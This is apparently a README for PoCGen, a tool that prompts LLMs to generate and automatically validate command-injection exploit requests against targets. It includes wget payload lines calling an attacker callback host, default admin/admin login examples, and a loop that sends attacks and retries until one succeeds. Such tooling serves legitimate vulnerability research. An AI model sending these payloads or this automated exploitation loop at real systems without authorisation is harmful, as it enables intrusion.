# PoCGen：基于大模型的PoC 生成器

PoCGen 将"漏洞描述 + 相关代码片段"转化为可直接落盘的原始 HTTP/Socket.IO PoC，支持 CVE 信息自动爬取、二进制漏洞分析（IDA MCP）、目标采样、自动验证与多轮自修正，默认聚焦命令注入场景，后续可扩展到 SQLi / SSTI / SSRF 等。

## 亮点
- **CVE 情报自动爬取**：`--CVENumber` 自动从 NVD 镜像（fkie-cad）拉取漏洞信息，爬取关联参考链接中的描述与 PoC，整合后注入提示词辅助生成。
- **IDA MCP 二进制分析**：`--binary` + `--ida-mcp-url` 调用远程 IDA Pro 反编译漏洞函数，将 sink/source/调用链分析结果注入提示词。
- **一键生成**：读取描述与代码文本，输出原始 `.http` 报文或 Socket.IO 事件 JSON。
- **多轮自修正**：支持"采样 → 生成 → 自动验证 → 回调监控"循环，按反馈修正请求直至成功或达最大轮次。
- **浏览器采样**：`--probe-target` + `--browser-login` 触发 Playwright 采集中包含登录流程的页面，抓取样本请求与 Cookie 供提示词参考。
- **Socket 事件**：`command_injection_socket` handler 输出合法的 Socket.IO 事件 JSON，并自动发包验证。
- **可扩展**：处理器（Handler）机制分离漏洞类型与提示词。

## 快速上手

```bash
# 创建虚拟环境（Python 3.9+，推荐 3.10+）
cd LLM_POC
python3 -m venv .venv
source .venv/bin/activate

# 安装依赖
pip install -r PoCGen/requirements.txt

# 浏览器采样需要额外安装 Playwright Chromium（可选）
playwright install chromium

# 最小示例（仅 HTTP PoC 生成）
python -m PoCGen.cli --desc desc.txt --code src/*.c

# 带 CVE 情报爬取
python -m PoCGen.cli --desc desc.txt --code src/*.c --CVENumber CVE-2025-9149

# 采样 + 自动验证
python -m PoCGen.cli --desc desc.txt --code src/*.c --target http://192.168.6.2 \
  --probe-target --auto-validate --max-iters 5

# Socket.IO 事件 PoC
python -m PoCGen.cli --desc desc.txt --code src/*.c \
  --target ws://192.168.6.2:3000/socket.io/?EIO=4&transport=websocket \
  --vuln-type command_injection_socket --auto-validate
```

## 完整测试命令

```bash
python3 -m PoCGen.cli \
  --desc /path/to/desc.txt \
  --code "/path/to/src/*.c" \
  --target http://192.168.6.2 \
  --CVENumber CVE-2025-9149 \
  --binary /path/to/firmware.cgi \
  --ida-mcp-url http://127.0.0.1:8745/mcp \
  --probe-target --browser-login \
  --login-url http://192.168.6.2 \
  --login-username admin --login-password admin \
  --auto-validate --max-iters 5 \
  --payload "wget http://192.168.6.1:6666/testpoc"
```

## 目录速览
- `config/`：配置加载，含默认模型与输出目录设置。
- `llm/`：OpenAI SDK 封装，发送系统/用户消息给大模型。
- `prompts/`：提示词模板与拼装函数（HTTP / Socket 两种漏洞类型）。
- `core/`：主流程、数据模型、解析与校验、采样、验证、监控。
  - `core/vuln_analyzer.py`：二进制漏洞分析（源码 + IDA MCP）。
  - `core/ida_mcp_client.py` / `ida_mcp_service.py`：IDA MCP 远程调用。
  - `core/sampler.py`：Playwright 目标采样。
  - `core/attacker_monitor.py`：wget 回调监控。
- `tools/getWeb.py`：CVE 情报爬取（fkie-cad NVD 镜像 → 参考链接爬虫 → LLM 整合）。
- `cli.py`：命令行入口。
- `output/`：输出根目录。
  - `poc/`：HTTP PoC 报文。
  - `socket/`：Socket.IO 事件 PoC。
  - `cve_cache/`：CVE 情报缓存（按 CVE-ID 命名，自动复用）。
  - `cookie/`：浏览器采样 Cookie/请求响应。
- `tests/`：提示与解析的最小单测。

## 工作流程

```
                    ┌─────────────────────┐
                    │   CLI 输入参数       │
                    │  desc / code / CVE   │
                    └──────────┬──────────┘
                               │
              ┌────────────────┼────────────────┐
              ▼                ▼                ▼
     CVE 情报爬取      二进制漏洞分析      目标采样
   (getWeb.py)      (vuln_analyzer)    (sampler.py)
   info/reason/webpoc  sink/source/路径   请求样本/Cookie
              │                │                │
              └────────────────┼────────────────┘
                               ▼
                    提示词拼装 (prompts/)
                    system + user 消息
                               │
                               ▼
                       LLM 生成 PoC
                               │
                    ┌──────────┴──────────┐
                    ▼                     ▼
              HTTP .http            Socket .json
                    │                     │
                    └──────────┬──────────┘
                               ▼
                    自动验证 + 回调监控
                    (remote_validator +
                     attacker_monitor)
                               │
                          反馈修正循环
                    (max-iters 轮次)
```

1. **CVE 情报爬取**（`--CVENumber`）：从 fkie-cad NVD 镜像拉取 CVE JSON，爬取参考链接（优先 Exploit 标签），LLM 整合为 `{info, reason, webpoc}` 注入提示词。
2. **二进制分析**（`--binary`）：调用 IDA MCP 反编译二进制，提取漏洞函数的 sink/source/调用链，注入提示词。
3. **目标采样**（`--probe-target`）：Playwright 访问目标，采集请求样本与 Cookie，作为 Blueprint 注入提示词。
4. **LLM 生成**：拼装 system + user 消息，调用大模型生成原始 PoC。
5. **自动验证**（`--auto-validate`）：发送生成的 PoC 到目标，等待 wget 回调确认成功。
6. **多轮修正**：解析/验证/监控失败时生成反馈，循环修正直至成功或达最大轮次。

## 配置（环境变量）

通过 `.env` 文件或环境变量配置，项目根目录放置 `.env` 即可自动加载。

### LLM 提供商配置
| 变量 | 说明 |
| --- | --- |
| `POCGEN_<PROVIDER>_BASE_URL` | 提供商 API 地址（OpenAI 兼容格式） |
| `POCGEN_<PROVIDER>_API_KEY` | 提供商 API Key |
| `POCGEN_<PROVIDER>_MODEL` | 提供商模型名称 |
| `POCGEN_DEFAULT_PROVIDER` | 默认模型提供商（如 `qwen`、`deepseek`） |

内置提供商为 `qwen`、`deepseek`、`glm`，对应环境变量前缀为 `POCGEN_QWEN_`、`POCGEN_DS_`、`POCGEN_GLM_`。

### 通用配置
| 变量 | 说明 | 默认 |
| --- | --- | --- |
| `POCGEN_TIMEOUT` | LLM 请求超时（秒） | 60 |
| `POCGEN_OUTPUT_ROOT` | 输出根目录 | `PoCGen/output` |
| `POCGEN_OUTPUT_DIR` | HTTP PoC 输出目录 | `${OUTPUT_ROOT}/poc` |
| `POCGEN_SOCKET_OUTPUT_DIR` | Socket PoC 输出目录 | `${OUTPUT_ROOT}/socket` |
| `POCGEN_COOKIE_DIR` | 浏览器报文目录 | `${OUTPUT_ROOT}/cookie` |
| `POCGEN_VULN_TYPE` | 漏洞类型 key | command_injection_http |
| `POCGEN_ATTACKER_URL` | payload wget 目标 | `http://192.168.6.1:6666/testpoc` |
| `POCGEN_HTTP_PROXY` | 采样/验证可选代理 | 空 |
| `POCGEN_MAX_ITERS` | 最大迭代轮次 | 1 |
| `POCGEN_STOP_ON_SUCCESS` | 回调成功后是否提前停止 | true |
| `POCGEN_MONITOR_TIMEOUT` | 每轮等待回调秒数 | 10 |
| `BROWSER_HEADLESS` | 浏览器采样是否无头 | true |

代理配置（用于 CVE 爬虫，读取系统环境变量）：
| 变量 | 说明 |
| --- | --- |
| `http_proxy` / `HTTP_PROXY` | HTTP 代理 |
| `https_proxy` / `HTTPS_PROXY` | HTTPS 代理 |

## CLI 参数

| 参数 | 说明 |
| --- | --- |
| `--desc` | 漏洞描述文件路径 |
| `--code` | 相关源代码文件（支持 glob） |
| `--target` | 目标 URL（用于提示词构造与自动验证） |
| `--CVENumber` | CVE 编号，自动爬取漏洞情报 |
| `--binary` | 漏洞二进制文件路径（配合 IDA MCP 分析） |
| `--ida-mcp-url` | IDA MCP 服务地址（如 `http://127.0.0.1:8745/mcp`） |
| `--vuln-type` | 漏洞类型（`command_injection_http` / `command_injection_socket`） |
| `--payload` | 攻击 payload（如 `wget http://ip:port/poc`） |
| `--probe-target` | 采样目标页面/接口 |
| `--browser-login` | 使用 Playwright 浏览器采样 |
| `--login-url` | 登录页 URL |
| `--login-username` / `--login-password` | 登录凭证 |
| `--auto-validate` | 生成后自动发送验证 |
| `--max-iters` | 最大迭代轮次 |
| `--monitor-timeout` | 每轮等待回调秒数 |

## 输出位置
- HTTP PoC：`output/poc/poc_<timestamp>_nn.http`
- Socket 事件：`output/socket/socket_poc_<timestamp>_nn.json`
- CVE 情报缓存：`output/cve_cache/<CVE-ID>.json`（重复查询自动复用）
- 浏览器采样：`output/cookie/<ts>-cookies.json` 与 `<ts>-cookie.http`

## 扩展新漏洞类型
1. 在 `prompts/` 添加对应提示词函数。
2. 在 `core/command_injection/` 新建继承 `VulnHandler` 的处理器。
3. 在 `core/generator.py` 的 `HANDLERS` 注册。
4. 通过 `--vuln-type` 或 `POCGEN_VULN_TYPE` 选择。

## 注意
- 工具生成 PoC 但不会在未开启 `--auto-validate` 时主动发包；请确保使用场景获得授权。
- CVE 爬虫需要网络访问 fkie-cad GitHub 镜像和 NVD API，如在国内需配置 `https_proxy`。
- IDA MCP 依赖远程 Windows IDA Pro 服务，需提前启动。
